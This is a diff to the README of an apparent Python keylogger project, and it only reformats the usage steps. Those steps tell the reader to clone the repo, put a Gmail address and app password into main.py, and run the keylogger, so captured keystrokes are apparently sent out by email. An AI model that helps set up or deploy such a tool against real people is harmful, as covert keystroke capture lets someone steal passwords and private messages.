@@ -20,16 +20,16 @@ This tool is intended strictly for **educational and ethical purposes** such as 
 
 ## 🚀 Usage
 
-# 1. Clone the repository
+1. Clone the repository
 git clone https://github.com/yourusername/python-keylogger.git
 cd python-keylogger
 
-# 2. Open main.py and add your Gmail & App Password
-#    Replace:
-#    EMAIL_ADDRESS = "your_email@gmail.com"
-#    EMAIL_PASSWORD = "your_app_password"
+2. Open main.py and add your Gmail & App Password
+   Replace:
+   EMAIL_ADDRESS = "your_email@gmail.com"
+   EMAIL_PASSWORD = "your_app_password"
 
-# 3. Run the keylogger
+3. Run the keylogger
 python main.py
 
 ---
